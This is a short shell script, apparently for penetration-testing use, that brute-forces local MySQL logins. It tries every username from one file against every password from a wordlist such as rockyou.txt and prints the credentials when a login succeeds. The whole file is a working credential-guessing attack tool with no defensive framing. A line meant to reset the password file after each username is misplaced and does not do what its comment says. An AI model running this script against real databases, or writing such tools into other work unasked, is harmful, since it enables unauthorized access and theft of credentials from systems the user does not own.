#!/bin/sh
# Brute force local mysql login
# Usage: ./mysql_brute.sh users.txt /home/kali/wordlists/rockyou.txt
# Script stops when correct password is found
# Check if correct number of arguments are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <username_list_file> <password_list_file>"
    exit 1
fi

# Assign arguments to variables
USER_LIST=$1
PASS_LIST=$2

# Check if files exist
if [ ! -f "$USER_LIST" ]; then
    echo "Username file '$USER_LIST' not found!"
    exit 1
fi

if [ ! -f "$PASS_LIST" ]; then
    echo "Password file '$PASS_LIST' not found!"
    exit 1
fi

# Counter for attempts
attempt=0

# Read usernames and passwords from files
while IFS= read -r username; do
    while IFS= read -r password; do
        attempt=`expr $attempt + 1`
        echo "Attempt #$attempt: Trying $username:$password"
        
        # Try to connect to MySQL
        # -B flag for batch mode, -s for silent, -N to skip column names
        result=$(mysql -u "$username" -p"$password" -h localhost -B -s -N -e "SELECT 1" 2>/dev/null)
        
        if [ $? -eq 0 ]; then
            echo "SUCCESS! Found valid credentials:"
            echo "Username: $username"
            echo "Password: $password"
            exit 0
        else
            echo "Failed"
        fi
        
    done < "$PASS_LIST"
    # Reset password file pointer for next username
    exec < "$PASS_LIST"
done < "$USER_LIST"

echo "No valid credentials found after $attempt attempts"
exit 1
